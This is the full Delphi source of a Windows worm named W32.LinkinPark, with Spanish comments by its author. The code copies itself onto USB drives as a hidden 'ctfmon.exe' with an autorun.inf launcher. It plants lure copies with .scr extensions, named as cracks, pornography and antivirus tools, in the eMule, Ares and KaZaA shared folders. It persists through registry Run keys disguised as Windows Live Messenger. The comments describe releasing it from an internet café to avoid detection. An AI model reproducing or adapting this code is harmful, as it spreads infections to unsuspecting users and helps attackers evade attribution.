   program W32.LinkinPark;

   //----------------------
   //|   W32.LinkinPark    |
   //|     by Khronos      |
   //|    CopyLeft 2007    |
   //----------------------



   //no se me ocurre otra cosa :p y el worm lo hice escuchando Linkin park xD

   {$APPTYPE GUI}

   //applicaion de consola ms-dos
   //lo voy a desarrollar de forma no-visual para que ocupe menos y luego lo empaquetare con upx.

   //en principio pense en hacer el worm para anunciar el regreso de Gedzac Labs

   //el worm se va a extender por USB y P2P, quizas en otra version se propague por mail

   uses
     SysUtils, Windows, Registry, shellapi;

     var
     Unidad: string;
     Worm: Array[0..260] of char;
     folder: string;
     OS: string;
     dir: string;

   const
   CSIDL_PROFILE = 40;
   SHGFP_TYPE_CURRENT = 0;

   function SHGetFolderPath(hwndOwner: HWND;
   nFolder: Integer;
   hToken: THandle;
   dwFlags: DWORD;
   pszPath: LPTSTR): HRESULT; stdcall;
   external 'Shell32.dll' name 'SHGetFolderPathA';


   //funcion para obtener la carpeta del usuario...
   function GetUserProfile: string;
   var
   Buffer: array[0..MAX_PATH] of Char;
   begin
   FillChar(Buffer, SizeOf(Buffer), 0);
   SHGetFolderPath(0, CSIDL_PROFILE, 0, SHGFP_TYPE_CURRENT, Buffer);
   Result := String(PChar(@Buffer));
   end;


   //con esta funcion detectas si la unidad de timpo REMOVABLE esta preparada...
     function DrivePreparado(Drive: Char): Boolean;
        var
          ErrorMode: word;
        begin
          if Drive in ['a'..'z'] then Dec(Drive, $20);
          if not (Drive in ['A'..'Z']) then
            raise EConvertError.Create('Not a valid drive ID');
          ErrorMode := SetErrorMode(SEM_FailCriticalErrors);
          try
            if DiskSize(Ord(Drive) - $40) = -1 then
              Result := False
            else
              Result := True;
          finally
            SetErrorMode(ErrorMode);
          end;
        end;



   //Manos a la obra...

   //Vamos a buscar las unidades USB desde la letra C a la Z, ya que
   //la unidad A y B esta definidas por el sistema como las unidades de disquetera
   //la unidad c va a ser el HDD


   //Los disketes ya no se usann y ahora estan de moda los pendrive, la memoria de la camara, mp3, mp4, etc..
   procedure InfectarUsb;
   var
   Drive: Char;
   Autorun: textfile;
   begin
   for Drive:= 'c' to 'z' do
   //Si el tipo de unidadd es de tipo Removable (es decir USB)....
   if getDriveType(PCHAR(Drive + ':\')) = DRIVE_REMOVABLE then BEGIN
   //para mayor comodidad asignamos a la variable global Unidad el drive
   Unidad:=(UPCASE(Drive)) + ':\';

            //ahora toca detectar si la unidad esta lista para ser usada
            //esto es muy necesario porque las computadoras de hoy en dia suelen venir con lector de tarjetas
            //y te va a detectar por ejemplo las unidades F, G, H , I y J como USB pero si no tienen ninguna tarjeta de memoria
            //va a dar un gran fallo... ;) y no keremos ke nos descubran... todavia :D

           //***************** si esta preparado ***********************
               if DrivePreparado(Drive)=true then
                 begin
                      //Comprobar si el USB ya contiene nuestro worm
                   if not(FileExists(Unidad + 'ctfmon.exe')=true) then begin
                       //Si no lo tiene, lo copia
                     CopyFile(Worm, PCHAR(Unidad + 'ctfmon.exe'), true);
                     //y lo oculta...
                     FileSetAttr(Unidad + 'ctfmon.exe', faHidden or faReadOnly);
                   end;

                      //Si no hay autorun.inf ... lo crea
                 if not(FileExists(Unidad + 'autorun.inf')=true) then begin
                      //Con un autorun.inf en el usb conseguiremos que cada vez que el usuario
                      //vaya a mipc y haga doble click sobre el icono del USb cargue nuestro worm
                 AssignFile(Autorun, Unidad + 'autorun.inf');
                 Rewrite(Autorun);
                 Writeln(Autorun, '[AUTORUN]');
                 Writeln(Autorun,  'OPEN=ctfmon.exe');
                 Writeln(Autorun, 'shell\open\command=ctfmon.exe ');
                 Writeln(Autorun, 'shell\open=');
                 Closefile(Autorun);
                 FileSetAttr(Unidad + 'autorun.inf', faHidden or faReadOnly);
                 end;

           end;

            //************************ fin de la condicion ***************************
         END;
   //fin del procedure...
   end;



   //ahora vamos a crear el procedure para el autorun en el registro de windows;
   procedure Autorun (name, path : string);
   var
   Reg: TRegistry;
   begin
   Reg:= TRegistry.create;
   Reg.RootKey:= HKEY_LOCAL_MACHINE;
   Reg.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run', true);
   Reg.WriteString(name, path);
   Reg.Destroy;
   end;

   //funciona para obtener el directorio de windows...
   function Windowsfolder : String;
      var
         pcWindowsDirectory : PChar;
         dwWDSize           : DWORD;
      begin
         dwWDSize := MAX_PATH + 1;
         GetMem( pcWindowsDirectory, dwWDSize );
         try
            if Windows.GetWindowsDirectory( pcWindowsDirectory, dwWDSize ) <> 0 then
               Result := pcWindowsDirectory;
         finally
            FreeMem( pcWindowsDirectory );
         end;
      end;

      //aunque no se para que hago esta funcion casi todo el mundo usa windows xp...


      //aca la firma del worm anunciando el regreso de gedzac
     //la voy a guardar en .html
   procedure firma;
   var
   text: textfile;
   Khronos: textfile;
   begin
   AssignFile(text, OS + '\firma.html');
   Rewrite(text);
   Writeln(text, '<html>');
   Writeln(text, '<title>W32.LinkinPark</title>');
   Writeln(text, '');
   Writeln(text, '<head>');
   Writeln(text, '');
   Writeln(text, '<body>');
   Writeln(text, '');
   Writeln(text, '<p>----------------------------------------------------------------------</p>');
   Writeln(text, '<p>W32.LinkinPark</p>');
   Writeln(text, '<p>Gedzac Labs Returns</p>');
   Writeln(text, '<p>CopyLeft 2007 made in CodeGear Delphi 2007</p>');
   Writeln(text, '<p>Puedes estar tranquilo que este worm es inofensivo. Regresa Gedzac ' + #13 +
   'Labs ten mas cuidado, a lo mejor la proxima vez no es una broma :p</p>');
   Writeln(text, '<p>----------------------------------------------------------------------</p>');
   Writeln(text, '');
   Writeln(text, '</body>');
   Writeln(text, '');
   Writeln(text, '</html>');
   Closefile(text);

   //********************************************************************************
   //************************************ NOTA **************************************
   // en la firma que se va a ejecutar en cada autorranque no incluyo mi nick porque
   //el worm lo voy a lanzar desde un ciber y no quiero que nadie sospeche de mi
   //asi que la firma la voy a ocultar en otro html que no se ejecuta...


   AssignFile(Khronos, OS + '\cmd.html');
   ReWrite(Khronos);
   Writeln(Khronos, '<html>');
   Writeln(Khronos, '<title>W32.LinkinPark</title>');
   Writeln(Khronos, '');
   Writeln(Khronos, '<head>');
   Writeln(Khronos, '');
   Writeln(Khronos, '<body>');
   Writeln(Khronos, '');
   Writeln(Khronos, '<p>----------------------------------------------------------------------</p>');
   Writeln(Khronos, '<p>W32.LinkinPark</p>');
   Writeln(Khronos, '<p>by <strong>Khronos</strong></p>');
   Writeln(Khronos, '<p>Gedzac Labs Returns</p>');
   Writeln(Khronos, '<p>CopyLeft 2007 made in CodeGear Delphi 2007</p>');
   Writeln(Khronos, '<p>----------------------------------------------------------------------</p>');
   Writeln(Khronos, '');
   Writeln(Khronos, '</body>');
   Writeln(Khronos, '');
   Writeln(Khronos, '</html>');
   Closefile(Khronos);
   end;


   //vamos ha hacer el procedimiento para que el worm se extiendo por p2p emule, ares y kazaa...
   procedure P2P;
   begin
   //todo esto para el emule.................

   //en ingles..
   CopyFile(Worm, 'C:\Program Files\eMule\Incoming\Sexy Video.scr', true);
   CopyFile(Worm, 'C:\Program Files\eMule\Incoming\Video xXx.scr', true);
   CopyFile(Worm, 'C:\Program Files\eMule\Incoming\The best porn.scr', true);
   CopyFile(Worm, 'C:\Program Files\eMule\Incoming\Cracks 2007.scr', true);
   CopyFile(Worm, 'C:\Program Files\eMule\Incoming\Matrix the film.scr', true);
   CopyFile(Worm, 'C:\Program Files\eMule\Incoming\Pamel Anderson pictures.scr', true);
   CopyFile(Worm, 'C:\Program Files\eMule\Incoming\Elsa Pataky.scr', true);
   CopyFile(Worm, 'C:\Program Files\eMule\Incoming\Linkin Park - Faint.scr', true);
   CopyFile(Worm, 'C:\Program Files\eMule\Incoming\Linkin Park - In the end.scr', true);
   CopyFile(Worm, 'C:\Program Files\eMule\Incoming\Manga porn.scr', true);
   CopyFile(Worm, 'C:\Program Files\eMule\Incoming\Manual del hacker.scr', true);
   CopyFile(Worm, 'C:\Program Files\eMule\Incoming\Antivirus Nod32.scr', true);
   CopyFile(Worm, 'C:\Program Files\eMule\Incoming\Windows Vista Crack.scr', true);
   CopyFile(Worm, 'C:\Program Files\eMule\Incoming\Ubuntu AMD 64 crack + serials [by Khronos].scr', true);
   CopyFile(Worm, 'C:\Program Files\eMule\Incoming\Avril Lavigne - GirlFriend.scr', true);
   CopyFile(Worm, 'C:\Program Files\eMule\Incoming\Disturbed - Down with the sickness.scr', true);
   CopyFile(Worm, 'C:\Program Files\eMule\Incoming\KeyGenerator 2007 + 1000 serials [by Khronos].scr', true);
   CopyFile(Worm, 'C:\Program Files\eMule\Incoming\Counter Strike Source + serials.scr', true);
   CopyFile(Worm, 'C:\Program Files\eMule\Incoming\Youtube videos downloader.scr', true);
   CopyFile(Worm, 'C:\Program Files\eMule\Incoming\Hack messenger.scr', true);
   CopyFile(Worm, 'C:\Program Files\eMule\Incoming\Brute Force cracker 2007 [by Khronos].scr', true);
   //castellano...
   CopyFile(Worm, 'C:\Archivos de programa\eMule\Incoming\Sexy Video.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\eMule\Incoming\Video xXx.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\eMule\Incoming\The best porn.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\eMule\Incoming\Cracks 2007.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\eMule\Incoming\Matrix the film.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\eMule\Incoming\Pamel Anderson pictures.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\eMule\Incoming\Elsa Pataky.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\eMule\Incoming\Linkin Park - Faint.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\eMule\Incoming\Linkin Park - In the end.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\eMule\Incoming\Manga porn.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\eMule\Incoming\Manual del hacker.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\eMule\Incoming\Antivirus Nod32.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\eMule\Incoming\Windows Vista Crack.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\eMule\Incoming\Ubuntu AMD 64 crack + serials [by Khronos].scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\eMule\Incoming\Avril Lavigne - GirlFriend.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\eMule\Incoming\Disturbed - Down with the sickness.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\eMule\Incoming\KeyGenerator 2007 + 1000 serials [by Khronos].scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\eMule\Incoming\Counter Strike Source + serials.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\eMule\Incoming\Youtube videos downloader.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\eMule\Incoming\Hack messenger.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\eMule\Incoming\Brute Force cracker 2007 [by Khronos].scr', true);






   //ahora vamos con el ares....
   //en ingles...

   CopyFile(Worm, 'C:\Program Files\Ares\My shared folder\Sexy Video.scr', true);
   CopyFile(Worm, 'C:\Program Files\Ares\My shared folder\Video xXx.scr', true);
   CopyFile(Worm, 'C:\Program Files\Ares\My shared folder\The best porn.scr', true);
   CopyFile(Worm, 'C:\Program Files\Ares\My shared folder\Cracks 2007.scr', true);
   CopyFile(Worm, 'C:\Program Files\Ares\My shared folder\Matrix the film.scr', true);
   CopyFile(Worm, 'C:\Program Files\Ares\My shared folder\Pamel Anderson pictures.scr', true);
   CopyFile(Worm, 'C:\Program Files\Ares\My shared folder\Elsa Pataky.scr', true);
   CopyFile(Worm, 'C:\Program Files\Ares\My shared folder\Linkin Park - Faint.scr', true);
   CopyFile(Worm, 'C:\Program Files\Ares\My shared folder\Linkin Park - In the end.scr', true);
   CopyFile(Worm, 'C:\Program Files\Ares\My shared folder\Manga porn.scr', true);
   CopyFile(Worm, 'C:\Program Files\Ares\My shared folder\Manual del hacker.scr', true);
   CopyFile(Worm, 'C:\Program Files\Ares\My shared folder\Antivirus Nod32.scr', true);
   CopyFile(Worm, 'C:\Program Files\Ares\My shared folder\Windows Vista Crack.scr', true);
   CopyFile(Worm, 'C:\Program Files\Ares\My shared folder\Ubuntu AMD 64 crack + serials [by Khronos].scr', true);
   CopyFile(Worm, 'C:\Program Files\Ares\My shared folder\Avril Lavigne - GirlFriend.scr', true);
   CopyFile(Worm, 'C:\Program Files\Ares\My shared folder\Disturbed - Down with the sickness.scr', true);
   CopyFile(Worm, 'C:\Program Files\Ares\My shared folder\KeyGenerator 2007 + 1000 serials [by Khronos].scr', true);
   CopyFile(Worm, 'C:\Program Files\Ares\My shared folder\Counter Strike Source + serials.scr', true);
   CopyFile(Worm, 'C:\Program Files\Ares\My shared folder\Youtube videos downloader.scr', true);
   CopyFile(Worm, 'C:\Program Files\Ares\My shared folder\Hack messenger.scr', true);
   CopyFile(Worm, 'C:\Program Files\Ares\My shared folder\Brute Force cracker 2007 [by Khronos].scr', true);

   //castellano..
   CopyFile(Worm, 'C:\Archivos de programa\Ares\My shared folder\Sexy Video.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\Ares\My shared folder\Video xXx.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\Ares\My shared folder\The best porn.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\Ares\My shared folder\Cracks 2007.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\Ares\My shared folder\Matrix the film.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\Ares\My shared folder\Pamel Anderson pictures.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\Ares\My shared folder\Elsa Pataky.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\Ares\My shared folder\Linkin Park - Faint.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\Ares\My shared folder\Linkin Park - In the end.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\Ares\My shared folder\Manga porn.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\Ares\My shared folder\Manual del hacker.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\Ares\My shared folder\Antivirus Nod32.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\Ares\My shared folder\Windows Vista Crack.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\Ares\My shared folder\Ubuntu AMD 64 crack + serials [by Khronos].scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\Ares\My shared folder\Avril Lavigne - GirlFriend.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\Ares\My shared folder\Disturbed - Down with the sickness.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\Ares\My shared folder\KeyGenerator 2007 + 1000 serials [by Khronos].scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\Ares\My shared folder\Counter Strike Source + serials.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\Ares\My shared folder\Youtube videos downloader.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\Ares\My shared folder\Hack messenger.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\Ares\My shared folder\Brute Force cracker 2007 [by Khronos].scr', true);


   //y el kazaa...

   //ingles...
   CopyFile(Worm, 'C:\Program Files\KaZaA\My Shared Folder\Sexy Video.scr', true);
   CopyFile(Worm, 'C:\Program Files\KaZaA\My Shared Folder\Video xXx.scr', true);
   CopyFile(Worm, 'C:\Program Files\KaZaA\My Shared Folder\The best porn.scr', true);
   CopyFile(Worm, 'C:\Program Files\KaZaA\My Shared Folder\Cracks 2007.scr', true);
   CopyFile(Worm, 'C:\Program Files\KaZaA\My Shared Folder\Matrix the film.scr', true);
   CopyFile(Worm, 'C:\Program Files\KaZaA\My Shared Folder\Pamel Anderson pictures.scr', true);
   CopyFile(Worm, 'C:\Program Files\KaZaA\My Shared Folder\Elsa Pataky.scr', true);
   CopyFile(Worm, 'C:\Program Files\KaZaA\My Shared Folder\Linkin Park - Faint.scr', true);
   CopyFile(Worm, 'C:\Program Files\KaZaA\My Shared Folder\Linkin Park - In the end.scr', true);
   CopyFile(Worm, 'C:\Program Files\KaZaA\My Shared Folder\Manga porn.scr', true);
   CopyFile(Worm, 'C:\Program Files\KaZaA\My Shared Folder\Manual del hacker.scr', true);
   CopyFile(Worm, 'C:\Program Files\KaZaA\My Shared Folder\Antivirus Nod32.scr', true);
   CopyFile(Worm, 'C:\Program Files\KaZaA\My Shared Folder\Windows Vista Crack.scr', true);
   CopyFile(Worm, 'C:\Program Files\KaZaA\My Shared Folder\Ubuntu AMD 64 crack + serials [by Khronos].scr', true);
   CopyFile(Worm, 'C:\Program Files\KaZaA\My Shared Folder\Avril Lavigne - GirlFriend.scr', true);
   CopyFile(Worm, 'C:\Program Files\KaZaA\My Shared Folder\Disturbed - Down with the sickness.scr', true);
   CopyFile(Worm, 'C:\Program Files\KaZaA\My Shared Folder\KeyGenerator 2007 + 1000 serials [by Khronos].scr', true);
   CopyFile(Worm, 'C:\Program Files\KaZaA\My Shared Folder\Counter Strike Source + serials.scr', true);
   CopyFile(Worm, 'C:\Program Files\KaZaA\My Shared Folder\Youtube videos downloader.scr', true);
   CopyFile(Worm, 'C:\Program Files\KaZaA\My Shared Folder\Hack messenger.scr', true);
   CopyFile(Worm, 'C:\Program Files\KaZaA\My Shared Folder\Brute Force cracker 2007 [by Khronos].scr', true);

   //castellano
   CopyFile(Worm, 'C:\Archivos de programa\KaZaA\My Shared Folder\Sexy Video.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\KaZaA\My Shared Folder\Video xXx.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\KaZaA\My Shared Folder\The best porn.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\KaZaA\My Shared Folder\Cracks 2007.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\KaZaA\My Shared Folder\Matrix the film.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\KaZaA\My Shared Folder\Pamel Anderson pictures.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\KaZaA\My Shared Folder\Elsa Pataky.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\KaZaA\My Shared Folder\Linkin Park - Faint.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\KaZaA\My Shared Folder\Linkin Park - In the end.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\KaZaA\My Shared Folder\Manga porn.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\KaZaA\My Shared Folder\Manual del hacker.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\KaZaA\My Shared Folder\Antivirus Nod32.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\KaZaA\My Shared Folder\Windows Vista Crack.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\KaZaA\My Shared Folder\Ubuntu AMD 64 crack + serials [by Khronos].scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\KaZaA\My Shared Folder\Avril Lavigne - GirlFriend.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\KaZaA\My Shared Folder\Disturbed - Down with the sickness.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\KaZaA\My Shared Folder\KeyGenerator 2007 + 1000 serials [by Khronos].scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\KaZaA\My Shared Folder\Counter Strike Source + serials.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\KaZaA\My Shared Folder\Youtube videos downloader.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\KaZaA\My Shared Folder\Hack messenger.scr', true);
   CopyFile(Worm, 'C:\Archivos de programa\KaZaA\My Shared Folder\Brute Force cracker 2007 [by Khronos].scr', true);

   end;



   label back;
   begin
   //obtenemos la direccion de la carpeta de windows...
   OS:= windowsfolder;
   GetDir(0, dir);
   dir:= dir + '\autorun.inf';


   //******************************************
   //detectar si el worm se ejecuta desde una memoria USB
   if (FileExists(dir)=true) then
     begin
     //si es asi, explora esa unidad
     dir:= emptystr;
     GetDir(0, dir);
       Shellexecute(0, 'explore', pchar(dir), '', '', SW_SHOWNORMAL);
     end;
   //***********************************************


   folder:=  GetUserProfile + '\ctfmon.exe';
   //guardamos el worm en un array
   GetMoDuleFilename(0, Worm, SizeOf(Worm));
   P2P;


   //el worm va a permanecer en segundo plano
   //ejecutando estas acciones cada 5 segundos para evitar utilizar toda la cpu
   back:
   CopyFile(Worm, pchar(folder), true);
   FileSetAttr(folder, faHidden or faReadOnly);
   //creamos el autorun..
   Autorun('Windows Live Messenger 8.12', folder);
   Autorun('Windows Autorun', OS + '\firma.html');
   //llamamos al procedimiento para crear la firma
   firma;
   //llamamos al evento InfectarUsb
   InfectarUSB;


   Sleep(5000);
   //hacemos un respiro en el bucle para bajar el uso de la cpu
   goto back;

   //me quedo una obra de arte xDDDDD

   //Salu2 a GedZac me alegro de vuestro regreso :p








   end.
